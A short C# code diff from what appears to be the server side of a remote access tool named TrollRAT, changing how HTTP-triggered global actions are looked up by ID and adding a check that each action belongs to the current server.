@@ -96,9 +96,9 @@ namespace TrollRAT.Server.Commands
             {
                 int id = Int32.Parse(HttpUtility.ParseQueryString(context.Request.Url.Query).Get("id"));
 
-                foreach (GlobalActionServer action in server.Actions.Where(a => a is GlobalActionServer))
+                foreach (GlobalActionServer action in GlobalActionServer.ServerActions)
                 {
-                    if (action.ID == id)
+                    if (action.ID == id && action.Server == server)
                     {
                         action.execute();
                     }
